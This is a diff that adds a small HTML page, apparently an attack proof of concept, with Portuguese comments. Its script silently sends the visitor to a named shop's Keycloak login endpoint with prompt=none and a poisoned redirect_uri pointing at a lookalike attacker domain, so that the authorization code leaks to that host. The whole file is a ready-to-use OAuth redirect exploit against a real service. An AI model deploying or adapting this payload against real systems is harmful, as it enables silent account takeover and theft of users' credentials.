@@ -1,0 +1,17 @@
+<!doctype html><meta charset="utf-8">
+<script>
+/*
+  Redireciona o navegador para o endpoint legítimo do Keycloak
+  com o redirect_uri envenenado. O 302 subsequente cai no
+  domínio do atacante sem o usuário perceber.
+*/
+location =
+  "https://shop.ifood.com.br/auth/realms/shop/protocol/openid-connect/auth" +
+  "?client_id=shop-identity" +
+  "&redirect_uri="   + encodeURIComponent("https://shop.ifood.com.br:443.flashmail.win/callback") +
+  "&response_type=code" +
+  "&scope=openid" +
+  "&state=xyz" +
+  "&nonce=xyz" +
+  "&prompt=none";
+</script>
